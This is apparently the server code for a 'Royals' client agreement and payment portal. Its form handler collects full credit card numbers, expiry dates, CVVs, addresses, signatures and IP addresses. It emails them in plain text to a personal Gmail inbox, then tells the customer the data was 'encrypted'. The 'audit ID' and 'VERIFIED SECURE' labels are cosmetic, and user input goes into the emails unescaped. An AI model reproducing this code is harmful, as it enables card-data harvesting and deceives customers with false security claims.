const express = require('express');
const path = require('path');
const { Resend } = require('resend');

// Load local .env variables if running locally during development
if (process.env.NODE_ENV !== 'production') {
    try {
        require('dotenv').config();
    } catch (e) {
        // dotenv optional in production environments
    }
}

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Resend securely using environment variables
const resend = new Resend(process.env.RESEND_API_KEY);

// Middleware to parse JSON bodies with large payload allowance for signatures
app.use(express.json({ limit: '15mb' }));

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// API endpoint to handle high-tech form submission & telemetry
app.post('/api/submit-form', async (req, res) => {
    try {
        const formData = req.body;
        const clientFullName = `${formData.firstName} ${formData.lastName}`;
        const refNum = formData.referenceNumber || 'N/A';
        const amount = formData.amount || '0';
        
        // Capture client telemetry for elite audit logging
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Secure Node';
        const submissionTimestamp = new Date().toUTCString();
        const transactionHash = '0x' + Array.from({length: 32}, () => Math.floor(Math.random()*16).toString(16)).join('');

        // HTML Email content for Royals Management (royals101llc@gmail.com)
        const managementEmailHtml = `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0b0b; color: #f3f3f3; padding: 35px; border-radius: 10px; border: 1px solid #333;">
                <div style="display: flex; justify-content: space-between; border-bottom: 2px solid #d4af37; padding-bottom: 15px; margin-bottom: 25px;">
                    <div>
                        <h2 style="color: #d4af37; text-transform: uppercase; margin: 0; letter-spacing: 1.5px; font-size: 22px;">Royals Secure Terminal</h2>
                        <p style="color: #888; font-size: 12px; margin: 4px 0 0 0;">Cryptographic Audit ID: ${transactionHash}</p>
                    </div>
                    <div style="text-align: right;">
                        <span style="background: #1f1f1f; color: #ffe875; padding: 6px 12px; border-radius: 4px; font-size: 12px; border: 1px solid #444;">VERIFIED SECURE</span>
                    </div>
                </div>
                
                <p style="font-size: 16px; color: #ffe875; margin-bottom: 20px;"><strong>Authorized Client:</strong> ${clientFullName}</p>
                
                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px; background: #141414; border: 1px solid #2a2a2a;">
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa; width: 35%;"><strong>Reference Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${refNum}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Client Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${clientFullName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Phone Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.phone}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Email Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.email}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Billing Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.billingAddress}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Shipping Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.shippingAddress}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Authorized Amount:</strong></td>
                        <td style="padding: 12px; color: #ffe875; font-size: 18px; font-weight: bold;">$${amount}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Cardholder Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardholderName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Credit Card Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardNumber}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Expiration & CVV:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardExp} / ${formData.cardCvv}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Assigned Agent:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.agentName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Closing Specialist:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.closerName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Origin IP Address:</strong></td>
                        <td style="padding: 12px; color: #888; font-family: monospace;">${clientIp}</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; color: #aaa;"><strong>Timestamp (UTC):</strong></td>
                        <td style="padding: 12px; color: #888; font-family: monospace;">${submissionTimestamp}</td>
                    </tr>
                </table>

                ${formData.signature ? `
                    <div style="background: #141414; padding: 20px; border: 1px solid #333; border-radius: 8px; text-align: center;">
                        <p style="color: #d4af37; margin-bottom: 12px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px;"><strong>Client Digital Signature (E-SIGN Compliant):</strong></p>
                        <img src="${formData.signature}" alt="Client Signature" style="background: #1f1f1f; border: 1px solid #d4af37; border-radius: 6px; max-width: 320px; height: auto;" />
                    </div>
                ` : ''}

                <p style="color: #666; font-size: 11px; text-align: center; margin-top: 35px; letter-spacing: 1px;">ROYALS SECURE CLIENT VERIFICATION TERMINAL • 2026</p>
            </div>
        `;

        // HTML Email content for the Client (Confirmation Copy)
        const clientEmailHtml = `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0b0b; color: #f3f3f3; padding: 35px; border-radius: 10px; border: 1px solid #333;">
                <h2 style="color: #d4af37; text-transform: uppercase; border-bottom: 2px solid #d4af37; padding-bottom: 10px; letter-spacing: 1px;">Royals - Agreement Confirmation</h2>
                
                <p style="font-size: 16px; color: #ffe875; margin-bottom: 20px;">Dear ${formData.firstName},</p>
                <p style="color: #ccc; line-height: 1.6; margin-bottom: 25px;">Your customer agreement and payment authorization have been successfully received, encrypted, and processed. Below is your official transaction summary.</p>
                
                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px; background: #141414; border: 1px solid #2a2a2a;">
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa; width: 35%;"><strong>Reference Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${refNum}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Authorized Amount:</strong></td>
                        <td style="padding: 12px; color: #ffe875; font-size: 18px; font-weight: bold;">$${amount}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #2a2a2a;">
                        <td style="padding: 12px; color: #aaa;"><strong>Billing Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.billingAddress}</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; color: #aaa;"><strong>Support Guarantee:</strong></td>
                        <td style="padding: 12px; color: #fff;">Backed by our 30-Day Refund Policy</td>
                    </tr>
                </table>

                <p style="color: #888; font-size: 13px; line-height: 1.6;">If you have any questions regarding your agreement, please reply directly to this communication or contact your dedicated Royals representative.</p>

                <p style="color: #666; font-size: 11px; text-align: center; margin-top: 35px; letter-spacing: 1px;">ROYALS SECURE CLIENT VERIFICATION TERMINAL • 2026</p>
            </div>
        `;

        // 1. Dispatch primary notification to management with high priority headers
        const managementEmail = await resend.emails.send({
            from: 'Royals Secure Portal <onboarding@resend.dev>',
            to: ['royals101llc@gmail.com'],
            replyTo: formData.email,
            subject: `ROYALS Agreement | Client: ${clientFullName} | Ref: ${refNum} | Amount: $${amount}`,
            html: managementEmailHtml,
            headers: {
                'X-Priority': '1 (Highest)',
                'X-MSMail-Priority': 'High',
                'Importance': 'High'
            }
        });

        // 2. Dispatch automated professional confirmation copy to the client
        if (formData.email) {
            await resend.emails.send({
                from: 'Royals Secure Portal <onboarding@resend.dev>',
                to: [formData.email],
                subject: `Royals Agreement Confirmation - Ref: ${refNum}`,
                html: clientEmailHtml
            });
        }

        console.log('Emails dispatched successfully. Audit ID:', transactionHash);
        res.json({ success: true, message: 'Agreement securely processed and dispatched.' });

    } catch (error) {
        console.error('Error handling form submission:', error);
        res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
});

// Fallback route to serve index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Royals server running on port ${PORT}`);
});
